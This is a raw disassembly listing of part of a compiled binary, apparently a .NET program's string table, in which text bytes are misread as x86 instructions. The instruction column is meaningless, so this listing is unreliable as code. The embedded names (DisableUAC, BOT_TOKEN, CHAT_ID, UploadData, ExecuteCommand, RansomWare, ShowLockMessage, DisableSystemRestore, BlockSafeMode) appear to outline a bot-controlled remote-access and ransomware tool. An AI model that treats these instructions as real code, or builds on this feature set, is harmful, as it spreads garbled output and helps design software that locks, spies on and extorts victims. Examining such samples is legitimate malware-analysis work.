  405363:	69 73 74 60 31 00 46 	imul   $0x46003160,0x74(%ebx),%esi
  40536a:	6f                   	outsl  %ds:(%esi),(%dx)
  40536b:	72 6d                	jb     0x4053da
  40536d:	31 00                	xor    %eax,(%eax)
  40536f:	4d                   	dec    %ebp
  405370:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405377:	74 2e                	je     0x4053a7
  405379:	57                   	push   %edi
  40537a:	69 6e 33 32 00 55 49 	imul   $0x49550032,0x33(%esi),%ebp
  405381:	6e                   	outsb  %ds:(%esi),(%dx)
  405382:	74 33                	je     0x4053b7
  405384:	32 00                	xor    (%eax),%al
  405386:	46                   	inc    %esi
  405387:	75 6e                	jne    0x4053f7
  405389:	63 60 32             	arpl   %esp,0x32(%eax)
  40538c:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40538f:	66 5f                	pop    %di
  405391:	5f                   	pop    %edi
  405392:	41                   	inc    %ecx
  405393:	6e                   	outsb  %ds:(%esi),(%dx)
  405394:	6f                   	outsl  %ds:(%esi),(%dx)
  405395:	6e                   	outsb  %ds:(%esi),(%dx)
  405396:	79 6d                	jns    0x405405
  405398:	6f                   	outsl  %ds:(%esi),(%dx)
  405399:	75 73                	jne    0x40540e
  40539b:	54                   	push   %esp
  40539c:	79 70                	jns    0x40540e
  40539e:	65 30 60 33          	xor    %ah,%gs:0x33(%eax)
  4053a2:	00 49 6e             	add    %cl,0x6e(%ecx)
  4053a5:	74 36                	je     0x4053dd
  4053a7:	34 00                	xor    $0x0,%al
  4053a9:	3c 3e                	cmp    $0x3e,%al
  4053ab:	39 00                	cmp    %eax,(%eax)
  4053ad:	3c 4d                	cmp    $0x4d,%al
  4053af:	6f                   	outsl  %ds:(%esi),(%dx)
  4053b0:	64 75 6c             	fs jne 0x40541f
  4053b3:	65 3e 00 42 6c       	gs add %al,%ds:0x6c(%edx)
  4053b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4053b9:	63 6b 55             	arpl   %ebp,0x55(%ebx)
  4053bc:	53                   	push   %ebx
  4053bd:	42                   	inc    %edx
  4053be:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4053c2:	61                   	popa
  4053c3:	62 6c 65 4f          	bound  %ebp,0x4f(%ebp,%eiz,2)
  4053c7:	41                   	inc    %ecx
  4053c8:	43                   	inc    %ebx
  4053c9:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4053cd:	61                   	popa
  4053ce:	62 6c 65 55          	bound  %ebp,0x55(%ebp,%eiz,2)
  4053d2:	41                   	inc    %ecx
  4053d3:	43                   	inc    %ebx
  4053d4:	00 43 48             	add    %al,0x48(%ebx)
  4053d7:	41                   	inc    %ecx
  4053d8:	54                   	push   %esp
  4053d9:	5f                   	pop    %edi
  4053da:	49                   	dec    %ecx
  4053db:	44                   	inc    %esp
  4053dc:	00 53 57             	add    %dl,0x57(%ebx)
  4053df:	5f                   	pop    %edi
  4053e0:	48                   	dec    %eax
  4053e1:	49                   	dec    %ecx
  4053e2:	44                   	inc    %esp
  4053e3:	45                   	inc    %ebp
  4053e4:	00 53 50             	add    %dl,0x50(%ebx)
  4053e7:	49                   	dec    %ecx
  4053e8:	46                   	inc    %esi
  4053e9:	5f                   	pop    %edi
  4053ea:	53                   	push   %ebx
  4053eb:	45                   	inc    %ebp
  4053ec:	4e                   	dec    %esi
  4053ed:	44                   	inc    %esp
  4053ee:	57                   	push   %edi
  4053ef:	49                   	dec    %ecx
  4053f0:	4e                   	dec    %esi
  4053f1:	49                   	dec    %ecx
  4053f2:	4e                   	dec    %esi
  4053f3:	49                   	dec    %ecx
  4053f4:	43                   	inc    %ebx
  4053f5:	48                   	dec    %eax
  4053f6:	41                   	inc    %ecx
  4053f7:	4e                   	dec    %esi
  4053f8:	47                   	inc    %edi
  4053f9:	45                   	inc    %ebp
  4053fa:	00 53 50             	add    %dl,0x50(%ebx)
  4053fd:	49                   	dec    %ecx
  4053fe:	46                   	inc    %esi
  4053ff:	5f                   	pop    %edi
  405400:	55                   	push   %ebp
  405401:	50                   	push   %eax
  405402:	44                   	inc    %esp
  405403:	41                   	inc    %ecx
  405404:	54                   	push   %esp
  405405:	45                   	inc    %ebp
  405406:	49                   	dec    %ecx
  405407:	4e                   	dec    %esi
  405408:	49                   	dec    %ecx
  405409:	46                   	inc    %esi
  40540a:	49                   	dec    %ecx
  40540b:	4c                   	dec    %esp
  40540c:	45                   	inc    %ebp
  40540d:	00 67 65             	add    %ah,0x65(%edi)
  405410:	74 5f                	je     0x405471
  405412:	41                   	inc    %ecx
  405413:	53                   	push   %ebx
  405414:	43                   	inc    %ebx
  405415:	49                   	dec    %ecx
  405416:	49                   	dec    %ecx
  405417:	00 42 4f             	add    %al,0x4f(%edx)
  40541a:	54                   	push   %esp
  40541b:	5f                   	pop    %edi
  40541c:	54                   	push   %esp
  40541d:	4f                   	dec    %edi
  40541e:	4b                   	dec    %ebx
  40541f:	45                   	inc    %ebp
  405420:	4e                   	dec    %esi
  405421:	00 53 79             	add    %dl,0x79(%ebx)
  405424:	73 74                	jae    0x40549a
  405426:	65 6d                	gs insl (%dx),%es:(%edi)
  405428:	2e 49                	cs dec %ecx
  40542a:	4f                   	dec    %edi
  40542b:	00 47 65             	add    %al,0x65(%edi)
  40542e:	74 50                	je     0x405480
  405430:	75 62                	jne    0x405494
  405432:	6c                   	insb   (%dx),%es:(%edi)
  405433:	69 63 49 50 00 53 50 	imul   $0x50530050,0x49(%ebx),%esp
  40543a:	49                   	dec    %ecx
  40543b:	5f                   	pop    %edi
  40543c:	53                   	push   %ebx
  40543d:	45                   	inc    %ebp
  40543e:	54                   	push   %esp
  40543f:	44                   	inc    %esp
  405440:	45                   	inc    %ebp
  405441:	53                   	push   %ebx
  405442:	4b                   	dec    %ebx
  405443:	57                   	push   %edi
  405444:	41                   	inc    %ecx
  405445:	4c                   	dec    %esp
  405446:	4c                   	dec    %esp
  405447:	50                   	push   %eax
  405448:	41                   	inc    %ecx
  405449:	50                   	push   %eax
  40544a:	45                   	inc    %ebp
  40544b:	52                   	push   %edx
  40544c:	00 55 70             	add    %dl,0x70(%ebp)
  40544f:	6c                   	insb   (%dx),%es:(%edi)
  405450:	6f                   	outsl  %ds:(%esi),(%dx)
  405451:	61                   	popa
  405452:	64 44                	fs inc %esp
  405454:	61                   	popa
  405455:	74 61                	je     0x4054b8
  405457:	00 6d 73             	add    %ch,0x73(%ebp)
  40545a:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40545d:	6c                   	insb   (%dx),%es:(%edi)
  40545e:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  405465:	53                   	push   %ebx
  405466:	79 73                	jns    0x4054db
  405468:	74 65                	je     0x4054cf
  40546a:	6d                   	insl   (%dx),%es:(%edi)
  40546b:	2e 43                	cs inc %ebx
  40546d:	6f                   	outsl  %ds:(%esi),(%dx)
  40546e:	6c                   	insb   (%dx),%es:(%edi)
  40546f:	6c                   	insb   (%dx),%es:(%edi)
  405470:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405475:	6e                   	outsb  %ds:(%esi),(%dx)
  405476:	73 2e                	jae    0x4054a6
  405478:	47                   	inc    %edi
  405479:	65 6e                	outsb  %gs:(%esi),(%dx)
  40547b:	65 72 69             	gs jb  0x4054e7
  40547e:	63 00                	arpl   %eax,(%eax)
  405480:	53                   	push   %ebx
  405481:	74 61                	je     0x4054e4
  405483:	72 74                	jb     0x4054f9
  405485:	45                   	inc    %ebp
  405486:	6e                   	outsb  %ds:(%esi),(%dx)
  405487:	64 6c                	fs insb (%dx),%es:(%edi)
  405489:	65 73 73             	gs jae 0x4054ff
  40548c:	4d                   	dec    %ebp
  40548d:	75 73                	jne    0x405502
  40548f:	69 63 00 54 68 72 65 	imul   $0x65726854,0x0(%ebx),%esp
  405496:	61                   	popa
  405497:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  40549b:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40549f:	74 5f                	je     0x405500
  4054a1:	52                   	push   %edx
  4054a2:	65 64 00 53 79       	gs add %dl,%fs:0x79(%ebx)
  4054a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4054a8:	63 68 72             	arpl   %ebp,0x72(%eax)
  4054ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4054ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4054ad:	69 7a 65 64 00 67 65 	imul   $0x65670064,0x65(%edx),%edi
  4054b4:	74 5f                	je     0x405515
  4054b6:	63 68 61             	arpl   %ebp,0x61(%eax)
  4054b9:	74 5f                	je     0x40551a
  4054bb:	69 64 00 4e 65 77 47 	imul   $0x75477765,0x4e(%eax,%eax,1),%esp
  4054c2:	75 
  4054c3:	69 64 00 3c 63 68 61 	imul   $0x74616863,0x3c(%eax,%eax,1),%esp
  4054ca:	74 
  4054cb:	5f                   	pop    %edi
  4054cc:	69 64 3e 69 5f 5f 46 	imul   $0x69465f5f,0x69(%esi,%edi,1),%esp
  4054d3:	69 
  4054d4:	65 6c                	gs insb (%dx),%es:(%edi)
  4054d6:	64 00 3c 70          	add    %bh,%fs:(%eax,%esi,2)
  4054da:	61                   	popa
  4054db:	72 73                	jb     0x405550
  4054dd:	65 5f                	gs pop %edi
  4054df:	6d                   	insl   (%dx),%es:(%edi)
  4054e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4054e1:	64 65 3e 69 5f 5f 46 	fs gs imul $0x6c656946,%ds:0x5f(%edi),%ebx
  4054e8:	69 65 6c 
  4054eb:	64 00 3c 74          	add    %bh,%fs:(%esp,%esi,2)
  4054ef:	65 78 74             	gs js  0x405566
  4054f2:	3e 69 5f 5f 46 69 65 	imul   $0x6c656946,%ds:0x5f(%edi),%ebx
  4054f9:	6c 
  4054fa:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  4054fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4054ff:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  405503:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  405507:	65 43                	gs inc %ebx
  405509:	6f                   	outsl  %ds:(%esi),(%dx)
  40550a:	6d                   	insl   (%dx),%es:(%edi)
  40550b:	6d                   	insl   (%dx),%es:(%edi)
  40550c:	61                   	popa
  40550d:	6e                   	outsb  %ds:(%esi),(%dx)
  40550e:	64 00 63 6f          	add    %ah,%fs:0x6f(%ebx)
  405512:	6d                   	insl   (%dx),%es:(%edi)
  405513:	6d                   	insl   (%dx),%es:(%edi)
  405514:	61                   	popa
  405515:	6e                   	outsb  %ds:(%esi),(%dx)
  405516:	64 00 72 61          	add    %dh,%fs:0x61(%edx)
  40551a:	6e                   	outsb  %ds:(%esi),(%dx)
  40551b:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40551f:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  405526:	61 
  405527:	6c                   	insb   (%dx),%es:(%edi)
  405528:	75 65                	jne    0x40558f
  40552a:	4b                   	dec    %ebx
  40552b:	69 6e 64 00 73 65 74 	imul   $0x74657300,0x64(%esi),%ebp
  405532:	5f                   	pop    %edi
  405533:	49                   	dec    %ecx
  405534:	73 42                	jae    0x405578
  405536:	61                   	popa
  405537:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40553a:	72 6f                	jb     0x4055ab
  40553c:	75 6e                	jne    0x4055ac
  40553e:	64 00 43 72          	add    %al,%fs:0x72(%ebx)
  405542:	65 61                	gs popa
  405544:	74 65                	je     0x4055ab
  405546:	57                   	push   %edi
  405547:	69 6e 64 6f 77 73 53 	imul   $0x5373776f,0x64(%esi),%ebp
  40554e:	65 72 76             	gs jb  0x4055c7
  405551:	69 63 65 00 64 65 66 	imul   $0x66656400,0x65(%ebx),%esp
  405558:	61                   	popa
  405559:	75 6c                	jne    0x4055c7
  40555b:	74 49                	je     0x4055a6
  40555d:	6e                   	outsb  %ds:(%esi),(%dx)
  40555e:	73 74                	jae    0x4055d4
  405560:	61                   	popa
  405561:	6e                   	outsb  %ds:(%esi),(%dx)
  405562:	63 65 00             	arpl   %esp,0x0(%ebp)
  405565:	47                   	inc    %edi
  405566:	65 74 48             	gs je  0x4055b1
  405569:	61                   	popa
  40556a:	73 68                	jae    0x4055d4
  40556c:	43                   	inc    %ebx
  40556d:	6f                   	outsl  %ds:(%esi),(%dx)
  40556e:	64 65 00 42 6c       	fs add %al,%gs:0x6c(%edx)
  405573:	6f                   	outsl  %ds:(%esi),(%dx)
  405574:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  405577:	61                   	popa
  405578:	66 65 4d             	gs dec %bp
  40557b:	6f                   	outsl  %ds:(%esi),(%dx)
  40557c:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  405581:	74 5f                	je     0x4055e2
  405583:	70 61                	jo     0x4055e6
  405585:	72 73                	jb     0x4055fa
  405587:	65 5f                	gs pop %edi
  405589:	6d                   	insl   (%dx),%es:(%edi)
  40558a:	6f                   	outsl  %ds:(%esi),(%dx)
  40558b:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  405591:	65 74 65             	gs je  0x4055f9
  405594:	53                   	push   %ebx
  405595:	75 62                	jne    0x4055f9
  405597:	4b                   	dec    %ebx
  405598:	65 79 54             	gs jns 0x4055ef
  40559b:	72 65                	jb     0x405602
  40559d:	65 00 46 72          	add    %al,%gs:0x72(%esi)
  4055a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4055a2:	6d                   	insl   (%dx),%es:(%edi)
  4055a3:	49                   	dec    %ecx
  4055a4:	6d                   	insl   (%dx),%es:(%edi)
  4055a5:	61                   	popa
  4055a6:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  4055ab:	74 5f                	je     0x40560c
  4055ad:	4d                   	dec    %ebp
  4055ae:	65 73 73             	gs jae 0x405624
  4055b1:	61                   	popa
  4055b2:	67 65 00 53 68       	add    %dl,%gs:0x68(%bp,%di)
  4055b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4055b8:	77 4c                	ja     0x405606
  4055ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4055bb:	63 6b 4d             	arpl   %ebp,0x4d(%ebx)
  4055be:	65 73 73             	gs jae 0x405634
  4055c1:	61                   	popa
  4055c2:	67 65 00 6d 65       	add    %ch,%gs:0x65(%di)
  4055c7:	73 73                	jae    0x40563c
  4055c9:	61                   	popa
  4055ca:	67 65 00 42 6c       	add    %al,%gs:0x6c(%bp,%si)
  4055cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4055d0:	63 6b 57             	arpl   %ebp,0x57(%ebx)
  4055d3:	61                   	popa
  4055d4:	6c                   	insb   (%dx),%es:(%edi)
  4055d5:	6c                   	insb   (%dx),%es:(%edi)
  4055d6:	70 61                	jo     0x405639
  4055d8:	70 65                	jo     0x40563f
  4055da:	72 43                	jb     0x40561f
  4055dc:	68 61 6e 67 65       	push   $0x65676e61
  4055e1:	00 45 6e             	add    %al,0x6e(%ebp)
  4055e4:	75 6d                	jne    0x405653
  4055e6:	65 72 61             	gs jb  0x40564a
  4055e9:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4055ed:	49                   	dec    %ecx
  4055ee:	44                   	inc    %esp
  4055ef:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4055f6:	6c                   	insb   (%dx),%es:(%edi)
  4055f7:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4055fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4055fc:	74 69                	je     0x405667
  4055fe:	6d                   	insl   (%dx),%es:(%edi)
  4055ff:	65 54                	gs push %esp
  405601:	79 70                	jns    0x405673
  405603:	65 48                	gs dec %eax
  405605:	61                   	popa
  405606:	6e                   	outsb  %ds:(%esi),(%dx)
  405607:	64 6c                	fs insb (%dx),%es:(%edi)
  405609:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40560d:	74 54                	je     0x405663
  40560f:	79 70                	jns    0x405681
  405611:	65 46                	gs inc %esi
  405613:	72 6f                	jb     0x405684
  405615:	6d                   	insl   (%dx),%es:(%edi)
  405616:	48                   	dec    %eax
  405617:	61                   	popa
  405618:	6e                   	outsb  %ds:(%esi),(%dx)
  405619:	64 6c                	fs insb (%dx),%es:(%edi)
  40561b:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40561f:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  405623:	67 6c                	insb   (%dx),%es:(%di)
  405625:	65 00 45 78          	add    %al,%gs:0x78(%ebp)
  405629:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  40562d:	65 50                	gs push %eax
  40562f:	6f                   	outsl  %ds:(%esi),(%dx)
  405630:	77 65                	ja     0x405697
  405632:	72 53                	jb     0x405687
  405634:	68 65 6c 6c 46       	push   $0x466c6c65
  405639:	69 6c 65 00 43 6f 6e 	imul   $0x736e6f43,0x0(%ebp,%eiz,2),%ebp
  405640:	73 
  405641:	6f                   	outsl  %ds:(%esi),(%dx)
  405642:	6c                   	insb   (%dx),%es:(%edi)
  405643:	65 00 44 6f 63       	add    %al,%gs:0x63(%edi,%ebp,2)
  405648:	6b 53 74 79          	imul   $0x79,0x74(%ebx),%edx
  40564c:	6c                   	insb   (%dx),%es:(%edi)
  40564d:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405651:	74 5f                	je     0x4056b2
  405653:	46                   	inc    %esi
  405654:	6f                   	outsl  %ds:(%esi),(%dx)
  405655:	72 6d                	jb     0x4056c4
  405657:	42                   	inc    %edx
  405658:	6f                   	outsl  %ds:(%esi),(%dx)
  405659:	72 64                	jb     0x4056bf
  40565b:	65 72 53             	gs jb  0x4056b1
  40565e:	74 79                	je     0x4056d9
  405660:	6c                   	insb   (%dx),%es:(%edi)
  405661:	65 00 46 6f          	add    %al,%gs:0x6f(%esi)
  405665:	6e                   	outsb  %ds:(%esi),(%dx)
  405666:	74 53                	je     0x4056bb
  405668:	74 79                	je     0x4056e3
  40566a:	6c                   	insb   (%dx),%es:(%edi)
  40566b:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40566f:	74 5f                	je     0x4056d0
  405671:	57                   	push   %edi
  405672:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405679:	79 6c                	jns    0x4056e7
  40567b:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40567f:	6f                   	outsl  %ds:(%esi),(%dx)
  405680:	63 65 73             	arpl   %esp,0x73(%ebp)
  405683:	73 57                	jae    0x4056dc
  405685:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40568c:	79 6c                	jns    0x4056fa
  40568e:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405692:	74 5f                	je     0x4056f3
  405694:	46                   	inc    %esi
  405695:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40569c:	00 
  40569d:	47                   	inc    %edi
  40569e:	65 74 46             	gs je  0x4056e7
  4056a1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4056a8:	00 
  4056a9:	67 65 74 5f          	addr16 gs je 0x40570c
  4056ad:	4d                   	dec    %ebp
  4056ae:	61                   	popa
  4056af:	63 68 69             	arpl   %ebp,0x69(%eax)
  4056b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4056b3:	65 4e                	gs dec %esi
  4056b5:	61                   	popa
  4056b6:	6d                   	insl   (%dx),%es:(%edi)
  4056b7:	65 00 63 75          	add    %ah,%gs:0x75(%ebx)
  4056bb:	72 72                	jb     0x40572f
  4056bd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4056bf:	74 45                	je     0x405706
  4056c1:	78 65                	js     0x405728
  4056c3:	4e                   	dec    %esi
  4056c4:	61                   	popa
  4056c5:	6d                   	insl   (%dx),%es:(%edi)
  4056c6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4056ca:	74 5f                	je     0x40572b
  4056cc:	55                   	push   %ebp
  4056cd:	73 65                	jae    0x405734
  4056cf:	72 4e                	jb     0x40571f
  4056d1:	61                   	popa
  4056d2:	6d                   	insl   (%dx),%es:(%edi)
  4056d3:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4056d7:	74 50                	je     0x405729
  4056d9:	72 6f                	jb     0x40574a
  4056db:	63 65 73             	arpl   %esp,0x73(%ebp)
  4056de:	73 65                	jae    0x405745
  4056e0:	73 42                	jae    0x405724
  4056e2:	79 4e                	jns    0x405732
  4056e4:	61                   	popa
  4056e5:	6d                   	insl   (%dx),%es:(%edi)
  4056e6:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  4056eb:	65 54                	gs push %esp
  4056ed:	69 6d 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%ebp),%ebp
  4056f4:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4056f7:	65 00 4c 6f 63       	add    %cl,%gs:0x63(%edi,%ebp,2)
  4056fc:	61                   	popa
  4056fd:	6c                   	insb   (%dx),%es:(%edi)
  4056fe:	4d                   	dec    %ebp
  4056ff:	61                   	popa
  405700:	63 68 69             	arpl   %ebp,0x69(%eax)
  405703:	6e                   	outsb  %ds:(%esi),(%dx)
  405704:	65 00 75 54          	add    %dh,%gs:0x54(%ebp)
  405708:	79 70                	jns    0x40577a
  40570a:	65 00 52 61          	add    %dl,%gs:0x61(%edx)
  40570e:	6e                   	outsb  %ds:(%esi),(%dx)
  40570f:	73 6f                	jae    0x405780
  405711:	6d                   	insl   (%dx),%es:(%edi)
  405712:	57                   	push   %edi
  405713:	61                   	popa
  405714:	72 65                	jb     0x40577b
  405716:	00 53 79             	add    %dl,0x79(%ebx)
  405719:	73 74                	jae    0x40578f
  40571b:	65 6d                	gs insl (%dx),%es:(%edi)
  40571d:	2e 43                	cs inc %ebx
  40571f:	6f                   	outsl  %ds:(%esi),(%dx)
  405720:	72 65                	jb     0x405787
  405722:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  405726:	61                   	popa
  405727:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  40572b:	79 73                	jns    0x4057a0
  40572d:	74 65                	je     0x405794
  40572f:	6d                   	insl   (%dx),%es:(%edi)
  405730:	52                   	push   %edx
  405731:	65 73 74             	gs jae 0x4057a8
  405734:	6f                   	outsl  %ds:(%esi),(%dx)
  405735:	72 65                	jb     0x40579c
  405737:	00 67 65             	add    %ah,0x65(%edi)
  40573a:	74 5f                	je     0x40579b
  40573c:	43                   	inc    %ebx
  40573d:	75 6c                	jne    0x4057ab
  40573f:	74 75                	je     0x4057b6
  405741:	72 65                	jb     0x4057a8
  405743:	00 73 65             	add    %dh,0x65(%ebx)
  405746:	74 5f                	je     0x4057a7
  405748:	43                   	inc    %ebx
  405749:	75 6c                	jne    0x4057b7
  40574b:	74 75                	je     0x4057c2
  40574d:	72 65                	jb     0x4057b4
  40574f:	00 72 65             	add    %dh,0x65(%edx)
  405752:	73 6f                	jae    0x4057c3
  405754:	75 72                	jne    0x4057c8
  405756:	63 65 43             	arpl   %esp,0x43(%ebp)
  405759:	75 6c                	jne    0x4057c7
  40575b:	74 75                	je     0x4057d2
  40575d:	72 65                	jb     0x4057c4
  40575f:	00 41 70             	add    %al,0x70(%ecx)
  405762:	70 6c                	jo     0x4057d0
  405764:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40576b:	53                   	push   %ebx
  40576c:	65 74 74             	gs je  0x4057e3
  40576f:	69 6e 67 73 42 61 73 	imul   $0x73614273,0x67(%esi),%ebp
  405776:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  40577b:	70 6f                	jo     0x4057ec
  40577d:	73 65                	jae    0x4057e4
  40577f:	00 42 6c             	add    %al,0x6c(%edx)
  405782:	6f                   	outsl  %ds:(%esi),(%dx)
  405783:	63 6b 4b             	arpl   %ebp,0x4b(%ebx)
  405786:	65 79 62             	gs jns 0x4057eb
  405789:	6f                   	outsl  %ds:(%esi),(%dx)
  40578a:	61                   	popa
  40578b:	72 64                	jb     0x4057f1
  40578d:	4d                   	dec    %ebp
  40578e:	6f                   	outsl  %ds:(%esi),(%dx)
  40578f:	75 73                	jne    0x405804
  405791:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  405796:	75 67                	jne    0x4057ff
  405798:	67 65 72 42          	addr16 gs jb 0x4057de
  40579c:	72 6f                	jb     0x40580d
  40579e:	77 73                	ja     0x405813
  4057a0:	61                   	popa
  4057a1:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  4057a5:	74 61                	je     0x405808
  4057a7:	74 65                	je     0x40580e
  4057a9:	00 45 64             	add    %al,0x64(%ebp)
  4057ac:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  4057b3:	77 
  4057b4:	73 61                	jae    0x405817
  4057b6:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  4057ba:	74 61                	je     0x40581d
  4057bc:	74 65                	je     0x405823
  4057be:	00 73 65             	add    %dh,0x65(%ebx)
  4057c1:	74 5f                	je     0x405822
  4057c3:	57                   	push   %edi
  4057c4:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4057cb:	61                   	popa
  4057cc:	74 65                	je     0x405833
  4057ce:	00 46 6f             	add    %al,0x6f(%esi)
  4057d1:	72 6d                	jb     0x405840
  4057d3:	57                   	push   %edi
  4057d4:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4057db:	61                   	popa
  4057dc:	74 65                	je     0x405843
  4057de:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  4057e2:	65 74 65             	gs je  0x40584a
  4057e5:	00 57 72             	add    %dl,0x72(%edi)
  4057e8:	69 74 65 00 53 54 41 	imul   $0x54415453,0x0(%ebp,%eiz,2),%esi
  4057ef:	54 
  4057f0:	68 72 65 61 64       	push   $0x64616572
  4057f5:	41                   	inc    %ecx
  4057f6:	74 74                	je     0x40586c
  4057f8:	72 69                	jb     0x405863
  4057fa:	62 75 74             	bound  %esi,0x74(%ebp)
  4057fd:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405801:	6d                   	insl   (%dx),%es:(%edi)
  405802:	70 69                	jo     0x40586d
  405804:	6c                   	insb   (%dx),%es:(%edi)
  405805:	65 72 47             	gs jb  0x40584f
  405808:	65 6e                	outsb  %gs:(%esi),(%dx)
  40580a:	65 72 61             	gs jb  0x40586e
  40580d:	74 65                	je     0x405874
  40580f:	64 41                	fs inc %ecx
  405811:	74 74                	je     0x405887
  405813:	72 69                	jb     0x40587e
  405815:	62 75 74             	bound  %esi,0x74(%ebp)
  405818:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  40581c:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  405823:	62 
  405824:	75 74                	jne    0x40589a
  405826:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40582a:	6e                   	outsb  %ds:(%esi),(%dx)
  40582b:	65 72 61             	gs jb  0x40588f
  40582e:	74 65                	je     0x405895
  405830:	64 43                	fs inc %ebx
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	64 65 41             	fs gs inc %ecx
  405836:	74 74                	je     0x4058ac
  405838:	72 69                	jb     0x4058a3
  40583a:	62 75 74             	bound  %esi,0x74(%ebp)
  40583d:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  405842:	75 67                	jne    0x4058ab
  405844:	67 65 72 4e          	addr16 gs jb 0x405896
  405848:	6f                   	outsl  %ds:(%esi),(%dx)
  405849:	6e                   	outsb  %ds:(%esi),(%dx)
  40584a:	55                   	push   %ebp
  40584b:	73 65                	jae    0x4058b2
  40584d:	72 43                	jb     0x405892
  40584f:	6f                   	outsl  %ds:(%esi),(%dx)
  405850:	64 65 41             	fs gs inc %ecx
  405853:	74 74                	je     0x4058c9
  405855:	72 69                	jb     0x4058c0
  405857:	62 75 74             	bound  %esi,0x74(%ebp)
  40585a:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40585f:	75 67                	jne    0x4058c8
  405861:	67 61                	addr16 popa
  405863:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  405867:	74 74                	je     0x4058dd
  405869:	72 69                	jb     0x4058d4
  40586b:	62 75 74             	bound  %esi,0x74(%ebp)
  40586e:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  405873:	75 67                	jne    0x4058dc
  405875:	67 65 72 42          	addr16 gs jb 0x4058bb
  405879:	72 6f                	jb     0x4058ea
  40587b:	77 73                	ja     0x4058f0
  40587d:	61                   	popa
  40587e:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  405882:	74 74                	je     0x4058f8
  405884:	72 69                	jb     0x4058ef
  405886:	62 75 74             	bound  %esi,0x74(%ebp)
  405889:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  40588d:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  405894:	77 
  405895:	73 61                	jae    0x4058f8
  405897:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40589b:	74 74                	je     0x405911
  40589d:	72 69                	jb     0x405908
  40589f:	62 75 74             	bound  %esi,0x74(%ebp)
